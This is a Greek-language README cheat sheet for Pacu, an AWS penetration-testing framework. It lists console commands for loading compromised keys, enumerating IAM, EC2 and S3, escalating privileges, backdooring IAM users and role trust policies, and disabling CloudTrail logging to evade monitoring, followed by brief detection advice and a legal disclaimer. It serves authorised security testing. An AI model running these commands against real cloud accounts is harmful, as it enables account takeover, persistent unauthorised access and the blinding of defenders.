<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


No ️ Pacu - Πλήρες φύλλο εξαπάτησης

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
  ██████╗  █████╗  ██████╗██╗   ██╗
  ██╔══██╗██╔══██╗██╔════╝██║   ██║
  ██████╔╝███████║██║     ██║   ██║
  ██╔═══╝ ██╔══██║██║     ██║   ██║
  ██║     ██║  ██║╚██████╗╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
       The AWS Exploitation Framework by Rhino Security Labs
```
<p align="center">
  <img src="https://img.shields.io/badge/Pacu-AWS_Exploitation-blue?style=for-the-badge" alt="Pacu">
  <img src="https://img.shields.io/badge/Author-Rhino_Security_Labs-orange?style=for-the-badge" alt="Rhino Security Labs">
  <img src="https://img.shields.io/badge/Platform-Amazon_Web_Services-gold?style=for-the-badge" alt="AWS">
  <img src="https://img.shields.io/badge/Category-Cloud_Security-green?style=for-the-badge" alt="Cloud Security">
</p>

<p align="center">
  <b>☁️ Το πλαίσιο εκμετάλλευσης AWS ανοιχτού κώδικα που έχει σχεδιαστεί για δοκιμές διείσδυσης σε περιβάλλοντα cloud, κλιμάκωση προνομίων, συλλογή διαπιστευτηρίων και αναγνώριση υποδομής</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Επισκόπηση & Αρχιτεκτονική](#-επισκόπηση--αρχιτεκτονική)
- [Εγκατάσταση] (#-εγκατάσταση)
- [Διαχείριση περιόδου σύνδεσης & Εισαγωγή κλειδιού AWS](#-session-management--aws-key-import)
  - [Importing Compromised Credentials](#importing-compromised-credentials)
  - [Assumed Roles and Session Tokens](#assumed-roles-and-session-tokens)
- [Ενότητες αναγνώρισης και απαρίθμησης](#-reconnaissance--enumeration-modules)
  - [Enumerating Current IAM Permissions](#enumerating-current-iam-permissions)
  - [Σάρωση EC2 Instances & S3 Buckets](#scanning-ec2-instances--s3-buckets)
- [Τεχνικές κλιμάκωσης προνομίων στο AWS](#-privilege-escalation-techniques-in-aws)
  - [Automatic Privilege Escalation Scanner] (#automatic-privilege-escalation-scanner)
  - [Εκτέλεση μονάδων κλιμάκωσης](#executing-escalation-modules)
- [Εμμονή και αμυντική αποφυγή](#-επιμονή--άμυνα-διαφυγή)
  - [Backdooring IAM Roles & Users](#backdooring-iam-roles--users)
  - [Διακοπή καταγραφής CloudTrail](#disrupting-cloudtrail-logging)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & Detection](#-defensive-considerations--detection)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση & Αρχιτεκτονική

Δημιουργήθηκε από τα **Rhino Security Labs**, το **Pacu** είναι το "Metasploit για AWS". Έχει σχεδιαστεί για να μιμείται τακτικές αντιπάλου μέσα σε περιβάλλοντα υπηρεσιών Web της Amazon.

Το Pacu λειτουργεί χρησιμοποιώντας μια τοπική βάση δεδομένων SQLite που διατηρεί κατάσταση σε όλες τις προσβλητικές περιόδους λειτουργίας:
- **Modular Pipeline:** Πάνω από 40 εξειδικευμένες ενότητες που καλύπτουν την ανακάλυψη, την πλευρική κίνηση, την κλιμάκωση των προνομίων, την επιμονή και τη διήθηση.
- **Απαρίθμηση αδειών:** Αναλύει τις πολιτικές IAM χωρίς να ενεργοποιεί όρια ειδοποίησης δοκιμάζοντας τις ενέργειες API ή εξετάζοντας τις συνημμένες διαχειριζόμενες πολιτικές.
- **Privesc Automation:** Αξιολογεί γνωστές διαδρομές κλιμάκωσης αδειών IAM (όπως `iam:CreateAccessKey`, `iam:PassRole`, `iam:AttachUserPolicy`).

---

## 📥 Εγκατάσταση
```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Install dependencies in virtual environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Launch Pacu console
python3 pacu.py
```
---

## 🔑 Διαχείριση συνεδρίας & Εισαγωγή κλειδιού AWS

Κατά την εκκίνηση του Pacu, μπαίνετε σε μια διαδραστική κονσόλα. Δημιουργία ή επιλογή συνεδρίας:
```text
Pacu > set_session client_assessment
```
### Εισαγωγή παραβιασμένων διαπιστευτηρίων
```text
Pacu (client_assessment) > set_keys
Enter Key Alias: compromised_dev
Enter AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
Enter AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Enter AWS Session Token (Optional): 
Enter Default Region: us-east-1
```
### Υποτιθέμενοι ρόλοι και διακριτικά συνεδρίας
```text
# Switch active keys within the session
Pacu (client_assessment) > swap_keys
```
---

## 🔍 Ενότητες αναγνώρισης και απαρίθμησης

### Αριθμώντας τρέχοντα δικαιώματα IAM
Προσδιορίστε ποιος είστε και τι επιτρέπεται να κάνουν τα ενεργά διαπιστευτήρια:
```text
# Query caller identity and enumerate attached user/group/role policies
Pacu (client_assessment) > run iam__enum_permissions
Pacu (client_assessment) > whoami
```
### Σάρωση EC2 Instances & S3 Buckets
```text
# Enumerate all EC2 instances and security groups
Pacu (client_assessment) > run ec2__enum

# Enumerate accessible S3 buckets and identify public read/write permissions
Pacu (client_assessment) > run s3__enum
```
---

## ⚡ Τεχνικές κλιμάκωσης προνομίων στο AWS

Η κλιμάκωση των προνομίων του AWS βασίζεται σε κακώς διαμορφωμένες πολιτικές IAM που επιτρέπουν στους μη διαχειριστικούς χρήστες να εκχωρούν δικαιώματα διαχείρισης στον εαυτό τους ή σε άλλες οντότητες.

### Αυτόματος σαρωτής κλιμάκωσης προνομίων
Σαρώνει τα απαριθμημένα άδειά σας σε σχέση με 21+ τεκμηριωμένα διανύσματα AWS privesc:
```text
Pacu (client_assessment) > run iam__privesc_scan
```
*Το δείγμα εξόδου επισημαίνει ευάλωτα δικαιώματα όπως τα `iam:PutUserPolicy`, `iam:AttachUserPolicy` ή `iam:CreateAccessKey`.*

### Εκτέλεση μονάδων κλιμάκωσης
```text
# Exploit iam:AttachUserPolicy to attach AdministratorAccess
Pacu (client_assessment) > run iam__privesc_scan --exec

# Exploit iam:CreateAccessKey to create keys for another high-priv user
Pacu (client_assessment) > run iam__backdoor_users_keys --username target_admin
```
---

## 🛡️ Επιμονή & Αμυντική Αποφυγή

### Backdooring IAM Roles & Users
```text
# Add a new access key to an existing user for persistent access
Pacu (client_assessment) > run iam__backdoor_users_keys --username backup_service

# Modify assume-role trust policy to allow external account access
Pacu (client_assessment) > run iam__backdoor_assume_role --role-name ProductionSupport --external-account-id 123456789012
```
### Διακοπή καταγραφής CloudTrail
```text
# Identify CloudTrail trails
Pacu (client_assessment) > run cloudtrail__enum

# Stop logging on active trails to blind SOC monitors
Pacu (client_assessment) > run cloudtrail__disrupt_logging --trail-name CorpSecurityTrail
```
---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Στόχος | Εντολή Pacu |
|-----------|---------------|
| **Ορισμός/Επιλογή συνεδρίας** | `set_session <NAME>` |
| **Εισαγωγή διαπιστευτηρίων AWS** | `set_keys` |
| **Εμφάνιση τρέχουσας ταυτότητας** | `whoami` |
| **Αριθμήστε τα δικαιώματα IAM** | `run iam__enum_permissions` |
| **Σάρωση για Privesc Vectors** | `run iam__privesc_scan` |
| **Αριθμήστε S3 Buckets** | `run s3__enum` |
| **Αριθμήστε περιπτώσεις EC2** | `run ec2__enum` |
| **Διατάραξη του CloudTrail** | `run cloudtrail__disrupt_logging` |
| **Κατάλογος Διαθέσιμων Ενοτήτων** | `list` |

---

## 🛡️ Αμυντικές Θεωρήσεις & Ανίχνευση

1. **GuardDuty & CloudTrail Monitoring:** Η αυτοματοποιημένη κλιμάκωση προνομίων και η σάρωση αδειών της Pacu δημιουργούν γρήγορα διαδοχικά ερωτήματα API που επισημαίνονται εύκολα από το AWS GuardDuty.
2. **SCP & Όρια αδειών:** Επιβολή Πολιτικών Ελέγχου Υπηρεσίας Οργανισμών AWS (SCP) αποτρέποντας οποιονδήποτε κύριο—συμπεριλαμβανομένων των πλήρους διαχειριστών— από την παραβίαση του CloudTrail ή την τροποποίηση δομών ριζικού οργανισμού.

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Το Pacu έχει σχεδιαστεί ειδικά για εξουσιοδοτημένες δοκιμές διείσδυσης AWS και αξιολογήσεις ασφάλειας. Η δοκιμή λογαριασμών cloud χωρίς ρητή προηγούμενη άδεια από τον κάτοχο του στοιχείου παραβιάζει την Πολιτική Αποδεκτής Χρήσης Υπηρεσιών Ιστού της Amazon και το διεθνές δίκαιο.